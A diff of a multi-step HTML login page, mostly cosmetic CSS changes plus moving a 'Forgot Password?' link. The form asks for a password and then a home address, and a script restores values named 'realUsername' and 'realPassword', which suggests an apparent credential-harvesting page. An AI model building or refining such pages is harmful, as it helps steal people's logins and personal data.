@@ -71,7 +71,7 @@
 
         label { 
             display: block; 
-            margin: 20px 0 8px; 
+            margin: 18px 0 8px; 
             font-size: 1.05rem; 
             color: #1e2937; 
             font-weight: 600; 
@@ -79,34 +79,34 @@
 
         .input-group {
             position: relative;
-            margin-bottom: 10px;
+            margin-bottom: 8px;
         }
 
         input { 
             width: 100%; 
             padding: 14px 16px; 
-            border: 1.5px solid #e2e8f0; 
+            border: 2px solid #e2e8f0; 
             border-radius: 10px; 
             font-size: 1.1rem; 
             background: #fff;
+            transition: all 0.3s ease;
         }
 
         input:focus { 
             outline: none; 
             border-color: #1e40af; 
-            box-shadow: 0 0 0 3px rgba(30, 64, 175, 0.1);
+            box-shadow: 0 0 0 4px rgba(30, 64, 175, 0.15);
         }
 
         .toggle-password {
             position: absolute;
-            right: 15px;
+            right: 16px;
             top: 50%;
             transform: translateY(-50%);
             cursor: pointer;
             color: #1e40af;
             font-size: 0.95rem;
             font-weight: 500;
-            user-select: none;
         }
 
         .login-btn, .next-btn { 
@@ -184,26 +184,27 @@
                 <button type="button" class="next-btn" onclick="nextStep(2)">Next</button>
             </div>
 
-            <!-- Step 2: Password -->
+            <!-- Step 2: Password + Forgot Password -->
             <div id="step2" class="step">
                 <label for="password">Password</label>
                 <div class="input-group">
                     <input type="password" id="password" placeholder="Enter your password" required>
                     <span class="toggle-password" onclick="togglePassword()">Show</span>
                 </div>
+                
+                <div style="text-align: right; margin: 12px 0 20px;">
+                    <a href="forgot.html" style="color: #1e40af; font-size: 0.95rem; text-decoration: none;">Forgot Password?</a>
+                </div>
+
                 <button type="button" class="next-btn" onclick="nextStep(3)">Next</button>
                 <button type="button" onclick="prevStep(1)" style="background:none; border:none; color:#64748b; margin-top:12px;">← Back</button>
             </div>
 
-            <!-- Step 3: Address -->
+            <!-- Step 3: Home Address -->
             <div id="step3" class="step">
                 <label>Home Address (Current)</label>
                 <input type="text" id="address" placeholder="Enter your current home address" required>
                 
-                <div style="text-align: right; margin: 20px 0 10px;">
-                    <a href="forgot.html" style="color: #1e40af; font-size: 0.95rem; text-decoration: none;">Forgot Password?</a>
-                </div>
-
                 <button type="submit" class="login-btn">LOG IN</button>
                 <button type="button" onclick="prevStep(2)" style="background:none; border:none; color:#64748b;">← Back</button>
             </div>
@@ -247,7 +248,7 @@
             }
         }
 
-        // Auto-fill after reset
+        // Auto-fill after password reset
         window.onload = function() {
             const savedUsername = sessionStorage.getItem('realUsername');
             const savedPassword = sessionStorage.getItem('realPassword');
